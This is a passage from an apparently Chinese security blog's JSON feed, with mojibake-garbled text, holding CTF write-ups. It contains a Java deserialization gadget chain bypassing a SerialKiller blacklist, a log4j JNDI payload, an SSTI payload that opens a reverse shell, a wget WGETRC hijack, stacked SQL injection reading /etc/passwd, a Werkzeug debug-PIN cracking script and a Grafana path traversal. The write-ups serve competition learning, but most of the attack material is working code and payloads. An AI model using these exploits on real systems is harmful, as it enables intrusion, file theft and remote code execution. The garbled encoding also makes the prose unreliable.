&lt;regexp&gt;org\\.apache\\.commons\\.collections\\.functors\\.ChainedTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.functors\\.ConstantTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.functors\\.InstantiateTransformer$&lt;/regexp&gt; &lt;!-- ysoserial&#x27;s CommonsCollections2,4 payload --&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections4\\.functors\\.InvokerTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections4\\.functors\\.ChainedTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections4\\.functors\\.ConstantTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections4\\.functors\\.InstantiateTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections4\\.comparators\\.TransformingComparator$&lt;/regexp&gt;&lt;/blacklist&gt; Bypassæ—¢ç„¶å¦‚æ­¤é‚£ä¹ˆé¦–å…ˆå°±æ˜¯æƒ³åˆ°å»æ‰¾æ›¿æ¢ç±»è¾¾åˆ°åŒæ ·çš„æ•ˆæœå’¯ ä¸‹é¢æ˜¯æˆ‘é€šè¿‡ç®€å•æœç´¢å‘ç°çš„ç±»ï¼Œå½“ç„¶åé¢å‘ç°è§£å†³è¿™é¢˜æ–¹æ¡ˆå¾ˆå¤šï¼Œæˆ‘åªç»™ä¸€ä¸ª FactoryTransformerå¯ä»¥çœ‹åˆ°è¿™ä¸ªtrnasfromerçš„transformæ–¹æ³•ï¼Œå¯ä»¥è°ƒç”¨ä»»æ„Factoryå­ç±»çš„createæ–¹æ³• 123456789101112131415161718192021222324public class FactoryTransformer implements Transformer, Serializable &#123; private static final long serialVersionUID = -6817674502475353160L; private final Factory iFactory; public static Transformer getInstance(Factory factory) &#123; if (factory == null) &#123; throw new IllegalArgumentException(&quot;Factory must not be null&quot;); &#125; else &#123; return new FactoryTransformer(factory); &#125; &#125; public FactoryTransformer(Factory factory) &#123; this.iFactory = factory; &#125; public Object transform(Object input) &#123; return this.iFactory.create(); &#125; public Factory getFactory() &#123; return this.iFactory; &#125;&#125; å¯ä»¥çœ‹åˆ°ä¹Ÿä¸å¤šï¼Œä»åå­—å°±å¯ä»¥çœ‹å‡ºï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªå¯ä»¥ç”¨çš„ å…¶ä¸­org.apache.commons.collections.functors.ConstantFactory#createå¯ä»¥è¿”å›ä»»æ„å€¼ ä»£æ›¿ConstantTransformer org.apache.commons.collections.functors.InstantiateFactory#createå¯ä»¥å®ä¾‹åŒ–ä»»æ„ç±» ä»£æ›¿InstantiateTransformerå»å®ä¾‹åŒ–å¯¹è±¡ é‚£çœ‹åˆ°è¿™é‡Œä½ æœ‰ä»€ä¹ˆæ€è·¯äº†å—ï¼Ÿç†Ÿæ‚‰CCé“¾çš„ç«¥é‹ä¸€å®šä¼šçŸ¥é“TrAXFilterçš„æ„é€ å‡½æ•°å½“ä¸­å¯ä»¥å¸®åŠ©æˆ‘ä»¬è§¦å‘TemplatesImplå­—èŠ‚ç åŠ è½½çš„è¿‡ç¨‹ é€šè¿‡å¦‚ä¸‹æ„é€ ï¼Œæˆ‘ä»¬èƒ½å¾ˆè½»æ¾çš„è§¦å‘è®¡ç®—å™¨ Pså°ç»†èŠ‚ï¼šå¯¹expMapåšputæ“ä½œä¼šè§¦å‘hashCodeä¼šå¯¼è‡´åˆ©ç”¨é“¾åœ¨åºåˆ—åŒ–è¿‡ç¨‹å½“ä¸­è§¦å‘å¯¼è‡´æŠ¥é”™ï¼Œåˆ«å¿˜äº†å…ˆè®¾ç½®ä¸€ä¸ªæ— å…³ç´§è¦çš„transformer(æ¯”å¦‚ConstantTransformer)æœ€åå†åå°„æ›¿æ¢æˆæˆ‘ä»¬æ¶æ„çš„Transformer 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.FactoryTransformer;import org.apache.commons.collections.functors.InstantiateFactory;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import org.nibblesec.tools.SerialKiller;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Test &#123; public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123; Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); &#125; public static void main(String[] args) throws Exception&#123; TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123; ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode() &#125;); setFieldValue(obj, &quot;_name&quot;, &quot;1&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); InstantiateFactory instantiateFactory; instantiateFactory = new InstantiateFactory(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class ,new Class[]&#123;javax.xml.transform.Templates.class&#125;,new Object[]&#123;obj&#125;); FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory); ConstantTransformer constantTransformer = new ConstantTransformer(1); Map innerMap = new HashMap(); LazyMap outerMap = (LazyMap)LazyMap.decorate(innerMap, constantTransformer); TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;keykey&quot;); Map expMap = new HashMap(); expMap.put(tme, &quot;valuevalue&quot;); setFieldValue(outerMap,&quot;factory&quot;,factoryTransformer); outerMap.remove(&quot;keykey&quot;); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(expMap); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream ois = new SerialKiller(byteArrayInputStream, &quot;/Users/y4tacker/Downloads/ezjavaz/serialkiller.xml&quot;); ois.readObject(); &#125;&#125; åé¢å°±æ˜¯è·å–æ³¨å…¥ä¸€ä¸ªå†…å­˜é©¬å³å¯è·å–flagï¼Œè¿™éƒ¨åˆ†ä¸è°ˆåŸºç¡€ä¸œè¥¿è€Œå·² é‚£ä¹ˆå°±ç»“æŸäº†è¿™ä¸€é¢˜ Java_mem_shell_Filteré¦–å…ˆåªç»™äº†ä¸€ä¸ªç™»å½•åŠŸèƒ½ é€šè¿‡éšä¾¿è®¿é—®ä¸å­˜åœ¨é¡µé¢ï¼Œå¯¼è‡´æŠ¥é”™æŠ›å‡ºä¹Ÿå¯ä»¥å¾—åˆ°æ˜¯tomcat8.0.12ç‰ˆæœ¬ï¼Œé‚£ç‰ˆæœ¬é—®é¢˜å¯ä»¥å¿½ç•¥äº† æ¥ä¸‹æ¥ç”±äºåç«¯å“åº”çœŸçš„å¾ˆå¿«ï¼Œåœ¨å…¬å…±ç¯å¢ƒä¸‹èƒ½åšåˆ°è¿™æ ·é¦–å…ˆè€ƒè™‘å¼±å£ä»¤ï¼Œçˆ†ç ´æ— æ•ˆ çªç„¶æƒ³åˆ°èƒ½ä¸èƒ½æ‰“log4j2 1name=$&#123;jndi:rmi://xxxxx/exp&#125;&amp;password=admin åé¢æ‹¿flagä¹Ÿæ˜¯æ¯”è¾ƒé˜´é—´ï¼Œè¿™é‡Œä¸é‡è¦ä¸å†™äº†ï¼Œæ¶‰åŠåˆ°dumpå†…å­˜çš„æ“ä½œè¿˜æ˜¯å†™å†™å§ 1jmap -dump:format=b,file=e.bin &lt;pid&gt; Java_mem_shell_Basicå¯ä»¥çœ‹è§ç›´æ¥æ˜¯ä¸€ä¸ªtomcatï¼Œçœ‹äº†ç‰ˆæœ¬æ²¡å•¥å¯åˆ©ç”¨çš„1dayï¼ŒåŒæ—¶ç‰ˆæœ¬æ¯”è¾ƒä½ä¸å­˜åœ¨å¹½çµçŒ«æ¼æ´ é‚£ä¹ˆæ¥ä¸‹æ¥å°±åªèƒ½è€ƒè™‘åå°å¼±å£ä»¤äº†ï¼Œtomcat/tomcatï¼Œä¹‹åéƒ¨ç½²ä¸€ä¸ªwaråŒ…ä¸Šå»ï¼Œç›´æ¥å†°èä¸€æŠŠæ¢­å“ˆï¼Œå°±æ˜¯flagä½ç½®æ¯”è¾ƒé˜´é—´/usr/local/apache-tomcat-8.0.12/work/Catalina/localhost/ROOT/org/apache/jsp/threatbook_jsp.java","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Kryo","slug":"Kryo","permalink":"https://y4tacker.github.io/tags/Kryo/"},{"name":"Serialkiller","slug":"Serialkiller","permalink":"https://y4tacker.github.io/tags/Serialkiller/"}]},{"title":"2022*CTF-Web","slug":"year/2022/4/2022-CTF-Web","date":"2022-04-18T03:00:13.000Z","updated":"2024-08-04T09:01:49.210Z","comments":true,"path":"2022/04/18/year/2022/4/2022-CTF-Web/","link":"","permalink":"https://y4tacker.github.io/2022/04/18/year/2022/4/2022-CTF-Web/","excerpt":"","text":"2022*CTF-Webå†™åœ¨å‰é¢XCTFå›½é™…èµ›ç³»åˆ—ä¸€ç›´ä¸é”™ï¼Œå‘¨æœ«å‚ä¸äº†ä¸‹è¿™æ¬¡æ¯”èµ›ï¼Œè™½ç„¶æ²¡æœ‰Javaä½†æ€»ä½“è¿˜æ˜¯è›®æœ‰æ„æ€ è¿™é‡Œæ²¡æŒ‰é¢˜ç›®é¡ºåºå†™ï¼Œåªæ˜¯å†™äº†åœ¨æˆ‘å¿ƒä¸­ä»ä¸Šåˆ°ä¸‹çš„æ’åºï¼Œå¯¹æœ‰æºç çš„é¢˜ç›®åšäº†å¤‡ä»½ oh-my-lotto â€‹ é“¾æ¥: https://pan.baidu.com/s/1G53aYqIIbHGlowdWFhkKqw æå–ç : oism oh-my-lottoå¿ƒç›®ä¸­æ¯”è¾ƒæœ‰è¶£çš„ä¸€é¢˜å‘—ï¼Œé‡ç”Ÿä¹‹æˆ‘æ˜¯èµŒç¥ è¿™æ˜¯ä¸€ä¸ªéé¢„æœŸï¼Œå› ä¸ºåé¢åˆä¸Šäº†ä¸ªrevengeï¼Œç®€å•åˆ†æä¸‹é¢˜ç›®ï¼Œå…ˆçœ‹çœ‹dockerå†…å®¹ï¼Œå¯ä»¥çŸ¥é“å¤§æ¦‚çš„ç»“æ„ 12345678910111213141516171819version: &quot;3&quot; services: lotto: build: context: lotto/ dockerfile: Dockerfile container_name: &quot;lotto&quot; app: build: context: app/ dockerfile: Dockerfile links: - lotto container_name: &quot;app&quot; ports: - &quot;8880:8080&quot; ä¹‹åçœ‹çœ‹ä»£ç ï¼Œè¿™é‡Œé¢æœ‰ä¸‰ä¸ªè·¯ç”±ï¼Œä»çŸ­åˆ°é•¿ é¦–å…ˆresultè·¯ç”±è¿”å›/app/lotto_result.txtæ–‡ä»¶å†…å®¹ç»“æœ 123456789@app.route(&quot;/result&quot;, methods=[&#x27;GET&#x27;])def result(): if os.path.exists(&quot;/app/lotto_result.txt&quot;): lotto_result = open(&quot;/app/lotto_result.txt&quot;, &#x27;rb&#x27;).read().decode() else: lotto_result = &#x27;&#x27; return render_template(&#x27;result.html&#x27;, message=lotto_result) forecastè·¯ç”±å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ä¿å­˜åˆ°/app/guess/forecast.txt 1234567891011121314@app.route(&quot;/forecast&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def forecast(): message = &#x27;&#x27; if request.method == &#x27;GET&#x27;: return render_template(&#x27;forecast.html&#x27;) elif request.method == &#x27;POST&#x27;: if &#x27;file&#x27; not in request.files: message = &#x27;Where is your forecast?&#x27; file = request.files[&#x27;file&#x27;] file.save(&#x27;/app/guess/forecast.txt&#x27;) message = &quot;OK, I get your forecast. Let&#x27;s Lotto!&quot; return render_template(&#x27;forecast.html&#x27;, message=message) è¿˜æœ‰æœ€å…³é”®çš„lottoè·¯ç”±(ä»£ç å¤ªå¤šå°±ä¸æ”¾å®Œäº†)ï¼Œå¯ä»¥ 1os.system(&#x27;wget --content-disposition -N lotto&#x27;) å¦‚æœé¢„æµ‹çš„å€¼ä¸ç¯å¢ƒéšæœºç”Ÿæˆçš„ç›¸ç­‰å°±èƒ½è·å¾—flag 12345678910111213141516171819202122232425262728@app.route(&quot;/lotto&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def lotto(): elif request.method == &#x27;POST&#x27;: //çœ‹åˆ°flagä»ç¯å¢ƒå˜é‡å½“ä¸­å–å‡º flag = os.getenv(&#x27;flag&#x27;) lotto_key = request.form.get(&#x27;lotto_key&#x27;) or &#x27;&#x27; lotto_value = request.form.get(&#x27;lotto_value&#x27;) or &#x27;&#x27; lotto_key = lotto_key.upper() if safe_check(lotto_key): os.environ[lotto_key] = lotto_value try: //ä»å†…ç½‘http://lottoå½“ä¸­è·å¾—éšæœºå€¼ os.system(&#x27;wget --content-disposition -N lotto&#x27;) if os.path.exists(&quot;/app/lotto_result.txt&quot;): lotto_result = open(&quot;/app/lotto_result.txt&quot;, &#x27;rb&#x27;).read() else: lotto_result = &#x27;result&#x27; if os.path.exists(&quot;/app/guess/forecast.txt&quot;): forecast = open(&quot;/app/guess/forecast.txt&quot;, &#x27;rb&#x27;).read() else: forecast = &#x27;forecast&#x27; if forecast == lotto_result: return flag å…¶ä¸­å†…ç½‘çš„lottoé¡µé¢å¯ä»¥çœ‹åˆ°å°±æ˜¯éšæœºç”Ÿæˆ20ä¸ª40ä»¥å†…éšæœºæ•°å¹¶è¿”å› 123456789101112131415@app.route(&quot;/&quot;)def index(): lotto = [] for i in range(1, 20): n = str(secrets.randbelow(40)) lotto.append(n) r = &#x27;\\n&#x27;.join(lotto) response = make_response(r) response.headers[&#x27;Content-Type&#x27;] = &#x27;text/plain&#x27; response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=lotto_result.txt&#x27; return responseif __name__ == &quot;__main__&quot;: app.run(debug=True, host=&#x27;0.0.0.0&#x27;, port=80) åŒæ—¶å¯¹äºæˆ‘ä»¬èƒ½æ§åˆ¶çš„ç¯å¢ƒå˜é‡ä¹Ÿæœ‰è¿‡æ»¤safe_checkï¼Œé‚£åƒpç‰›ä¹‹å‰æåˆ°çš„ç›´æ¥RCEå°±ä¸è¡Œäº† 1234def safe_check(s): if &#x27;LD&#x27; in s or &#x27;HTTP&#x27; in s or &#x27;BASH&#x27; in s or &#x27;ENV&#x27; in s or &#x27;PROXY&#x27; in s or &#x27;PS&#x27; in s: return False return True æ—¢ç„¶é¢˜ç›®è¦æ±‚å¦‚æœé¢„æµ‹æˆåŠŸå°±è¿”å›ç»™æˆ‘flagï¼Œé‚£æœ‰å•¥åŠæ³•èƒ½æ§åˆ¶å—ï¼Œè¿™é‡Œå°±ç”¨åˆ°äº†PATH PATHå˜é‡å°±æ˜¯ç”¨äºä¿å­˜å¯ä»¥æœç´¢çš„ç›®å½•è·¯å¾„ï¼Œå¦‚æœå¾…è¿è¡Œçš„ç¨‹åºä¸åœ¨å½“å‰ç›®å½•ï¼Œæ“ä½œç³»ç»Ÿä¾¿å¯ä»¥å»ä¾æ¬¡æœç´¢PATHå˜é‡å˜é‡ä¸­è®°å½•çš„ç›®å½•ï¼Œå¦‚æœåœ¨è¿™äº›ç›®å½•ä¸­æ‰¾åˆ°å¾…è¿è¡Œçš„ç¨‹åºï¼Œæ“ä½œç³»ç»Ÿä¾¿å¯ä»¥ç›´æ¥è¿è¡Œï¼Œå‰ææ˜¯æœ‰æ‰§è¡Œæƒé™ é‚£è¿™æ ·å°±æ¯”è¾ƒç®€å•äº†ï¼Œå¦‚æœæˆ‘ä»¬æ§åˆ¶ç¯å¢ƒå˜é‡PATHï¼Œè®©ä»–æ‰¾ä¸åˆ°wgetï¼Œè¿™æ ·wget --content-disposition -N lottoå°±ä¼šæŠ¥é”™å¯¼è‡´ç¨‹åºç»ˆæ­¢ï¼Œ/app/lotto_result.txtå½“ä¸­çš„å†…å®¹å°±ä¸€ç›´æ˜¯ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œéšæœºç”Ÿæˆçš„é‚£ä¸ªå€¼äº† è®¿é—®/lottoè·å¾—ç¬¬ä¸€æ¬¡çš„ç»“æœ è®¿é—®resulté¡µé¢è®°å½•å†…å®¹ä¸‹æ¥å¤‡ç”¨ ä¿®æ”¹ç¯å¢ƒå˜é‡PATHåï¼Œå‘é€é¢„æµ‹å€¼ï¼Œå†æ¬¡è®¿é—®/lottoå³å¯ å¯ä»¥çœ‹åˆ°ç¡®å®å¾—åˆ°äº†flagï¼Œå…¶ä¸­res.txtæ˜¯ç¬¬ä¸€æ¬¡ç¯å¢ƒéšæœºç”Ÿæˆçš„ç»“æœ oh-my-lotto-revengeåšäº†ä¸€ä¸ªä¿®æ­£ï¼Œå°±ç®—é¢„æµ‹æˆåŠŸä¹Ÿæ²¡æœ‰ç»“æœè¿”å›ï¼Œé‚£å°±è€ƒè™‘å¦‚ä½•rceäº† 12345if forecast == lotto_result: return &quot;You are right!But where is flag?&quot;else: message = &#x27;Sorry forecast failed, maybe lucky next time!&#x27; return render_template(&#x27;lotto.html&#x27;, message=message) å…ˆè¯»æ–‡æ¡£https://www.gnu.org/software/wget/manual/wget.html#:~:text=6.1-,Wgetrc%20Location,-When%20initializing%2C%20Wget å‘ç°æœ‰ä¸€ä¸ªWGETRCï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ç¯å¢ƒå˜é‡å°±å¯ä»¥æ“çºµwgetçš„å‚æ•°äº†ï¼Œè¿™é‡Œæœ‰å¾ˆå¤šæœ‰æ„æ€çš„å˜é‡ è¿™é‡Œè¯´ä¸¤ä¸ªæˆ‘è§£å†³è¿™ä¸ªé—®é¢˜ç”¨åˆ°çš„ï¼Œä¸€ä¸ªæ˜¯http_proxyï¼Œå¾ˆæ˜æ˜¾å¦‚æœé…ç½®äº†è¿™ä¸ªï¼Œæœ¬æ¥æ˜¯ç›´æ¥wgetè®¿é—®http://lottoçš„å°±ä¼šå…ˆåˆ°æˆ‘ä»¬è¿™é‡Œåšä¸€ä¸ªè½¬å‘ï¼Œæˆ‘ä»¬å°±å¯ä»¥å½“ä¸€ä¸ªä¸­é—´äºº 12http_proxy = stringUse string as HTTP proxy, instead of the one specified in environment. åšä¸ªå®éªŒï¼Œæ­¤æ—¶å†wgetä»¥åï¼ŒæˆåŠŸæ¥æ”¶åˆ°è¿™ä¸ªè¯·æ±‚ å› æ­¤æˆ‘ä»¬åªéœ€è¦æ§åˆ¶è¿”å›å†…å®¹å³å¯ï¼Œé‚£æ—¢ç„¶å¯ä»¥æ§åˆ¶å†…å®¹äº†ï¼Œé‚£èƒ½å¦æ§åˆ¶ç›®å½•å‘¢ï¼Œæ­£å¥½æœ‰output_documentï¼Œç›¸å½“äº-Oå‚æ•° 12output_document = fileSet the output filenameâ€”the same as â€˜-O fileâ€™. é‚£ä¹ˆæˆ‘è¦†ç›–index.htmlæ‰“SSTIå³å¯ å› æ­¤å¾—åˆ°payloadï¼Œå†™å…¥å†…å®¹ä¸º 12http_proxy=http://xxxxxoutput_document = templates/index.html æ§åˆ¶è¿”å›å†…å®¹ä¸º 1&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;åå¼¹shell&#x27;).read()&#125;&#125; 1234567891011121314151617181920import requestsdef web(): url = &quot;http://xxx/&quot; r = requests.post(url + &quot;forecast&quot;, files=&#123;&#x27;file&#x27;: open(&quot;/Users/y4tacker/PycharmProjects/pythonProject/lottt/y4.txt&quot;, &quot;rb&quot;)&#125;) data = &#123; &quot;lotto_key&quot;: &quot;WGETRC&quot;, &quot;lotto_value&quot;: &quot;/app/guess/forecast.txt&quot; &#125; r = requests.post(url + &quot;lotto&quot;, data=data) print(r.text)if __name__ == &#x27;__main__&#x27;: web() oh-my-noteproå¥½å§åˆæ˜¯é»‘ç›’ï¼Œçƒ¦æ­»äº† ç™»å½•åï¼Œåªæœ‰ä¸€ä¸ªåˆ›å»ºnoteçš„åŠŸèƒ½ç‚¹ï¼Œå…ˆæ˜¯æµ‹è¯•äº†ä¸‹å„ç§SSTIçš„payloadæ²¡å•¥ååº”ï¼Œä¹‹åçŒœæµ‹æ˜¯ä¸æ˜¯è¦è·å–åˆ°adminçš„noteidï¼Œé¦–å…ˆçœ‹åˆ°è¿™ç§åˆè‡­åˆé•¿0pn2jtgnfer9zaijadymsmq347eqmay3çš„å­—ç¬¦è‚¯å®šæ˜¯ä¸èƒ½çˆ†ç ´ï¼Œå°è¯•sqlæ³¨å…¥ï¼Œç»å…¸å•å¼•å·æŠ¥é”™ å°è¯•å›æ˜¾æœ‰äº”åˆ—ï¼Œä½†æ˜¯payloadè¿™ä¹ˆç®€å•ï¼Œæ¯•ç«Ÿæ˜¯XCTFè‚¯å®šä¸å¯èƒ½sqlæ³¨å…¥å°±èƒ½ä»æ•°æ®åº“æ‹–å‡ºflag(å¤§æ¦‚ç‡æ— è¿‡æ»¤æ˜¯ä¸å¯èƒ½è¿™ä¹ˆç®€å•çš„)ï¼Œå½“ç„¶ä¹Ÿç¡®å®éªŒè¯äº†æ²¡æœ‰flagï¼Œç”šè‡³æ²¡æœ‰adminç”¨æˆ· æ¥ä¸‹æ¥å°è¯•load_fileè¯»æ–‡ä»¶ä¹Ÿä¸è¡Œï¼Œåé¢æƒ³å»çœ‹çœ‹ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œä¸€èˆ¬æˆ‘ä»¬é€šè¿‡ç±»ä¼¼show variables like xxxè¿™æ ·å»è¯»ï¼Œä½†æ˜¯å…¶å®ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡sqlè¯­å¥æ‹¿åˆ°globalå½“ä¸­çš„ä¿¡æ¯ 1select @@global.secure_file_priv å¥½å§çœŸæ‹¿ä½ æ²¡åŠæ³•æ´› åé¢å‘ç°local_infileå¼€äº†ï¼Œä¸çŸ¥é“è¿™æ˜¯å•¥å¯ä»¥çœ‹çœ‹CSS-T | Mysql Client ä»»æ„æ–‡ä»¶è¯»å–æ”»å‡»é“¾æ‹“å±• é‚£ä¹ˆè¦åˆ©ç”¨è‚¯å®šå¸¸è§„çš„æ³¨å…¥ä¸è¡Œï¼Œåªæœ‰ä¸€ä¸ªä¸œè¥¿èƒ½æ»¡è¶³ï¼Œé‚£å°±æ˜¯å †å æ³¨å…¥ï¼Œç®€å•éªŒè¯ä¸‹ 1http://123.60.72.85:5002/view?note_id=0&#x27; union select 1,2,3,4,5;select sleep(2)--+ é¡µé¢ç¡®å®æœ‰å»¶æ—¶é‚£éªŒè¯äº†æˆ‘ä»¬çš„çŒœæƒ³ï¼Œæ¥ä¸‹æ¥è¯»æ–‡ä»¶ 1http://123.60.72.85:5002/view?note_id=0&#x27; union select 1,2,3,4,5; create table y4(t text); load data local infile &#x27;/etc/passwd&#x27; INTO TABLE y4 LINES TERMINATED BY &#x27;\\n&#x27;--+ æœç„¶å¯ä»¥bro é‚£ä¹ˆæƒ³è¦rceåªå‰©ä¸€ä¸ªæ–¹æ³•å’¯ï¼Œéƒ½æœ‰æŠ¥é”™é¡µé¢äº†ï¼Œç®—ç®—pinå‘— éœ€è¦ï¼š 1.flaskæ‰€ç™»å½•çš„ç”¨æˆ·å 2.modname-ä¸€èˆ¬å›ºå®šä¸ºflask.app 3.getattr(app, â€œnameâ€, app.class.name) - å›ºå®šï¼Œä¸€èˆ¬ä¸ºFlask 4.åœ¨flaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„ï¼Œé€šè¿‡æŠ¥é”™æ³„æ¼ 5.å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•° 6.dockeræœºå™¨id ç½‘ä¸Šç›´æ¥æŠ„äº†ä¸€ä¸ªå‘ç°ä¸å¯¹ï¼Œç®€å•çœ‹äº†flaskç”Ÿæˆpinç çš„åœ°æ–¹ï¼Œåœ¨python3.8/site-packages/werkzeug/debug/__init__.py#get_pin_and_cookie_name å‘ç°python3.8ä»¥åä»åŸæ¥çš„md5æ”¹æˆäº†sha1 é‚£ç®€å•å†™ä¸ªåˆ©ç”¨è„šæœ¬å°±å¥½äº†å‘— 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import requestsimport reimport hashlibfrom itertools import chainurl = &quot;http://124.70.185.87:5002/view?note_id=&quot;payload1 = &quot;0&#x27; union select 1,2,3,4,5; create table y4(t text); load data local infile &#x27;/sys/class/net/eth0/address&#x27; INTO TABLE y4 LINES TERMINATED BY &#x27;\\\\n&#x27;--+&quot;payload2 = &quot;0&#x27; union select 1,2,3,4,5; create table yy4(t text); load data local infile &#x27;/proc/self/cgroup&#x27; INTO TABLE yy4 LINES TERMINATED BY &#x27;\\\\n&#x27;--+&quot;payload3 = &quot;0&#x27; union select 1,2,3,(select group_concat(t) from y4),1; --+&quot;payload4 = &quot;0&#x27; union select 1,2,3,(select group_concat(t) from yy4),1; --+&quot;headers = &#123; &quot;cookie&quot;:&quot;session=.eJwVi0EKwyAQAL8ie8mlEE3ArP1MWXdXCE21REsJpX-POcxlhvkB1z09WnlqhjvMkwvKHBktRmfD5J1NKj5EXBDZeppVAi5wg0_VPdNL-7UVEiPUyKw5rZuaYdTG45tq_crQZSumUezhOKRewP8E760nRw.YlqN-g.KZrp8S7tsXPS60cPH88awzRI35Q&quot;&#125;r = requests.get(url+payload1,headers=headers)r = requests.get(url+payload2,headers=headers)probably_public_bits = [ &#x27;ctf&#x27;# /etc/passwd &#x27;flask.app&#x27;,# é»˜è®¤å€¼ &#x27;Flask&#x27;,# é»˜è®¤å€¼ &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27; # æŠ¥é”™å¾—åˆ°]private_bits = [ str(int(re.search(&#x27;&lt;/h1&gt;&lt;pstyle=&quot;text-align:center&quot;&gt;(.*?)&lt;/p&gt;&lt;/ul&gt;&#x27;,requests.get(url+payload3,headers=headers).text.replace(&quot;\\n&quot;, &quot;&quot;).replace(&quot; &quot;,&quot;&quot;)).groups()[0].replace(&#x27;:&#x27;,&#x27;&#x27;),16)),# /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶ &#x27;1cc402dd0e11d5ae18db04a6de87223d&#x27;+re.search(&#x27;&lt;/h1&gt;&lt;pstyle=&quot;text-align:center&quot;&gt;(.*?)&lt;/p&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/body&gt;&lt;/html&gt;&#x27;,requests.get(url+payload4,headers=headers).text.replace(&quot;\\n&quot;, &quot;&quot;).replace(&quot; &quot;,&quot;&quot;)).groups()[0].split(&quot;,&quot;)[0].split(&quot;/&quot;)[-1]# /etc/machine-id + /proc/self/cgroup]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) oh-my-grafanaä¹‹å‰è¢«çˆ†æœ‰ä»»æ„æ–‡ä»¶è¯»ï¼Œä¸çŸ¥é“æœ‰å•¥æ’ä»¶ç®€å•fuzzä¸€ä¸‹å¾—åˆ° 1/public/plugins/alertGroups/../../../../../../../../etc/passwd å¤§æ¦‚çœ‹äº†ä¸‹æ–‡æ¡£çœ‹çœ‹èƒ½è¯»äº›ä»€ä¹ˆé…ç½® å…ˆæ˜¯è¯»äº†sqliteï¼Œdumpä¸‹æ¥æƒ³çœ‹çœ‹adminå¯†ç æ¥ç€ï¼Œå°è¯•å¾ˆå¤šæ²¡ç ´è§£æˆåŠŸï¼Œæ˜¾ç„¶æ˜¯æˆ‘ä¸æ‡‚å¯†ç å­¦ ä¸è¿‡åé¢çœ‹åˆ°äº†grafana.iniï¼Œé‡Œé¢æ³„æ¼äº†ï¼Œå¥½å§è¿˜æˆåŠŸç™»é™†äº† åå°å•¥éƒ½æ— ï¼Œä¸è¿‡æœ‰ä¸ªæ·»åŠ æ•°æ®æºçš„åœ°æ–¹ï¼Œæ˜¾ç„¶è¿™é‡Œè¢«æ³¨é‡Šäº†ï¼Œä½†æ˜¯çœŸçš„é“¾æ¥æˆåŠŸäº† åé¢å°±æ˜¯ä»»æ„æ‰§è¡Œsqlè¯­å¥æ‹¿ä¸‹äº†ï¼Œæ²¡å•¥éš¾åº¦","categories":[{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/tags/CTF/"},{"name":"Fastjson","slug":"Fastjson","permalink":"https://y4tacker.github.io/tags/Fastjson/"}]},{"title":"æµ…è°ˆShiro550å—Tomcat Headeré•¿åº¦é™åˆ¶å½±å“çªç ´","slug":"year/2022/4/æµ…è°ˆShiro550å—Tomcat-Headeré•¿åº¦é™åˆ¶å½±å“çªç 